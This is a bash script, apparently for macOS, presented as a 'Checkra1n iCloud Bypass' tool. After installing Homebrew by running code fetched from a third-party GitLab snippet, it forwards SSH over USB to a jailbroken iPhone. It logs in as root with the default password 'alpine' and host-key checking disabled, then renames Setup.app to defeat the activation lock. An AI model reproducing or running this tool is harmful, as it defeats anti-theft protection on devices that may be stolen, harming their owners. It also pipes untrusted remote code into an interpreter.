#!/bin/bash

echo "==> Checking for brew..."

which brew > /dev/null
if [ $? -ne 0 ]; then
    echo "==> You do not have Homebrew installed on your Mac."
    read -p "==> Homebrew is required to use this tool. Press enter/return to automatically install it... "
    /usr/bin/ruby -e "$(curl -fsSL https://gitlab.com/snippets/1909941/raw)"
fi

echo "==> Installing dependencies..."
brew install libusbmuxd https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb

clear
echo "**************** Checkra1n iCloud Bypass ****************"
echo
echo "=> By Luke:"
echo "=>   - u/TheLukeGuy"
echo "=>   - @ConsoleLogLuke"
echo
echo "==> WARNING: Do not use this tool for illegal purposes. If you do anything illegal with it, I am NOT responsible."
echo
echo "==> Setting up SSH over USB..."
iproxy 2222 44 2> /dev/null &

runcmd () {
    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 "$1" > /dev/null
}

echo "==> Bypassing iCloud lock..."
runcmd "mount -o rw,union,update / && mv /Applications/Setup.app /Applications/Setup.app.bypass && killall Setup && uicache --all && killall backboardd"

echo
echo "==> Done! :)"
